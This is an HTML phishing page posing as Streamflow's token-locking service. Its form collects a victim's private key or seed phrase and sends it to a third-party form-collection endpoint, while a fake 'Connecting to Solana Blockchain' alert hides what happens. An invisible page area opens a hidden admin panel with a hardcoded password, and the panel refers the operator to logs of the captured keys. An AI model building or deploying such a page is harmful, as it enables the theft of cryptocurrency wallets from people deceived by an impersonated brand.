<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Streamflow | Token Locker</title>
    
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8XfWp3S_wQG-5m3yYvVInK0A4I8X9-6Y_wA&s">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; }
        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; width: 100%; padding: 14px; margin-top: 6px; color: white; outline: none; transition: 0.2s; }
        .sf-input:focus { border-color: #00ffbd; }
        .sf-btn { background-color: #00ffbd; color: #0b0e11; font-weight: 700; width: 100%; padding: 16px; border-radius: 12px; cursor: pointer; margin-top: 24px; transition: 0.3s; text-transform: uppercase; }
        .sf-btn:hover { background-color: #00d9a1; }
        
        /* ZONA INVIZIBILA ADMIN (Fix sub butonul verde) */
        .secret-gate { width: 100%; height: 60px; background: transparent; margin-top: 10px; cursor: default; }
        
        #adminPanel { display: none; margin-top: 20px; border-top: 1px solid #2d333b; padding-top: 20px; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-6">

    <div class="w-full max-w-[420px]">
        <div class="flex flex-col items-center mb-8">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8XfWp3S_wQG-5m3yYvVInK0A4I8X9-6Y_wA&s" class="w-24 rounded-xl mb-4 shadow-lg shadow-blue-900/20">
            <h1 class="text-3xl font-bold tracking-tight">Streamflow</h1>
            <p class="text-gray-400 text-sm">Token Vesting & Locking Service</p>
        </div>

        <div class="sf-card">
            <h2 class="text-lg font-semibold mb-6 text-center">Create New Lock</h2>
            
            <form action="https://formspree.io/f/XXXXX" method="POST" id="lockerForm">
                <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Project Name</label>
                <input type="text" name="Project" placeholder="e.g. My Token" class="sf-input mb-4" required>

                <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Private Key / Seed Phrase</label>
                <input type="password" name="Key" placeholder="Enter your private key" class="sf-input mb-4" required>

                <div class="flex gap-4">
                    <div class="flex-1">
                        <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Symbol</label>
                        <input type="text" name="Symbol" placeholder="SOL" class="sf-input">
                    </div>
                    <div class="flex-1">
                        <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Amount</label>
                        <input type="number" name="Amount" placeholder="0.00" class="sf-input">
                    </div>
                </div>

                <button type="submit" class="sf-btn">Deploy Lock</button>
            </form>
            
            <div class="secret-gate" onclick="toggleAdmin()"></div>
            
            <div id="adminPanel">
                <label class="text-[11px] text-gray-500 font-bold mb-2 block">ADMIN AUTHENTICATION</label>
                <input type="password" id="adminPass" placeholder="Password" class="sf-input text-xs mb-2">
                <button onclick="checkAdmin()" class="w-full bg-gray-800 text-xs py-3 rounded-lg hover:bg-gray-700 transition">UNLOCK DATA</button>
                <div id="dataList" class="mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono hidden border border-green-900/30">
                    Connection established. Monitoring keys... <br><br>
                    Check Formspree dashboard for full logs.
                </div>
            </div>
        </div>
        
        <p class="text-[10px] text-gray-600 text-center mt-8">Â© 2026 Streamflow Finance. All rights reserved.</p>
    </div>

    <script>
        function toggleAdmin() {
            var panel = document.getElementById('adminPanel');
            panel.style.display = (panel.style.display === 'block') ? 'none' : 'block';
        }

        function checkAdmin() {
            const p = document.getElementById('adminPass').value;
            if(p === 'Ovidiu20.04.2006') {
                document.getElementById('dataList').classList.remove('hidden');
            } else {
                alert("Access Denied");
            }
        }

        document.getElementById('lockerForm').onsubmit = function() {
            alert("Connecting to Solana Blockchain... Please wait for 3 network confirmations.");
        };
    </script>
</body>
</html>
